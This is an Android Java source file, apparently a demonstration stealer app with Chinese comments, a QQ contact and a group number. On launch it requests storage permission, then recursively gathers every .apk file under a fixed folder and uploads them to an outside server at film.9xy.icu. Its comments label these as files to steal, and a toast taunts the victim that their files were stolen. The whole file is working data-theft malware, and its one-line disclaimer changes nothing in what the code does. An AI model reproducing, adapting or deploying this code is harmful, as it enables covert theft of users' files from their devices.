package com.hax.myapplication;
/*
 * 构建时间2023-12-03
 * 作者qq2972249837
 * 请勿做违法的勾当
 * 交流群687044733
 */

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_PERMISSION = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //权限检查与上传
        checkStoragePermission();
    }

    private void checkStoragePermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            //申请权限
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_PERMISSION);
        } else {
            autoUploadApkFiles();
        }
    }

    private void autoUploadApkFiles() {
        String dataDirPath = "/storage/emulated/0/MT2/apks/a";//要偷取的文件路径
        new FileUploadTask(this).execute(dataDirPath);
    }

    private static class FileUploadTask extends AsyncTask<String, Void, Boolean> {

        private final Context context;

        FileUploadTask(Context context) {
            this.context = context;
        }

        @Override
        protected Boolean doInBackground(String... params) {
            String dataDirPath = params[0];
            File dataDir = new File(dataDirPath);
            String uploadUrl = "http://film.9xy.icu/upload.php"; //服务端地址

            try {
                MultipartUtility multipart = new MultipartUtility(uploadUrl);

                //遍历文件
                uploadApkFiles(dataDir, multipart);

                //上传成功
                boolean isSuccess = multipart.finish();
                //打印结果


                Log.d("FileUploadTask", "Upload result: " + isSuccess);

                return isSuccess;
            } catch (Exception e) {
                e.printStackTrace();
                return false;//上传服务端失败
            }
        }

        private void uploadApkFiles(File dir, MultipartUtility multipart) {
            if (dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isDirectory()) {
                            // 递归处理子目录
                            uploadApkFiles(file, multipart);
                        } else if (file.getName().toLowerCase().endsWith(".apk")) {//需要偷的文件后缀
                            try {
                                multipart.addFilePart("file[]", file);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        }

        @Override
        protected void onPostExecute(Boolean result) {
            if (result) {
                showToast(context, "小老弟文件被偷了吧");
            } else {
                showToast(context, "主播给个存储权限");
            }
        }

        private void showToast(Context context, String message) {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
        }
    }

    //检测权限
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                autoUploadApkFiles();
            } else {
                Toast.makeText(this, "请给予权限", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
